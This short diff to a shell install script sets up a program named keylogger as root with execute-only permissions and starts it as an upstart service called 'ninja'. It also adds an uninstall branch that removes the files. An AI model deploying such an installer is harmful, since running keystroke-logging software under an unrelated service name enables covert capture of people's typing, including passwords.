@@ -21,7 +21,14 @@ shift
 		mv  '/bin/keylogger_config.sh' '/bin/keylogger'
 		sudo chown root:root '/bin/keylogger'
 		sudo chmod 100 '/bin/keylogger'
-		
+		start ninja
+	;;
+	
+		"uninstall")
+		stop ninja
+		rm '/lib/keyLogger'
+		rm '/bin/keylogger'
+		rm '/etc/init/ninja.conf'
 	;;
 esac
 
